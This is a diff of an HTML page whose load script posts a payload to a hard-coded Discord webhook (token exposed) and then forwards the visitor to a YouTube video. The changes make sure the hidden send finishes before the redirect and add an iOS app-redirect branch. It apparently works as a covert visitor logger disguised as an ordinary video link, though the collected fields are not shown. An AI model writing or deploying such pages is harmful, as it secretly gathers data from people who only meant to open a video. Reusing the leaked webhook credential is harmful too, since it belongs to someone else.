@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", async function() {
             let webhookUrl = "https://discord.com/api/webhooks/1344672818662609020/gfXlzjvO-d0Lfi4erj0Z_dvMzXclhAPID5vzzJyR68vovXEqXjhGFxO27sPyA5yXYD13";
 
             // Get time in Denmark
@@ -46,16 +46,28 @@
             };
 
             // Send data to Discord webhook
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(embed)
-            });
+            try {
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(embed)
+                });
+            } catch (error) {
+                console.error("Failed to send webhook:", error);
+            }
 
-            // Redirect after a short delay
+            // Delay redirect to ensure webhook sends
             setTimeout(() => {
-                window.location.replace("https://www.youtube.com/watch?v=xvFZjo5PgG0");
-            }, 500);
+                let isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+                if (isIOS) {
+                    window.location.href = "youtube://www.youtube.com/watch?v=xvFZjo5PgG0"; // Try opening YouTube app
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/watch?v=xvFZjo5PgG0"; // Fallback to website
+                    }, 1000);
+                } else {
+                    window.location.replace("https://www.youtube.com/watch?v=xvFZjo5PgG0");
+                }
+            }, 2000); // 2-second delay before redirect
         });
     </script>
 </head>
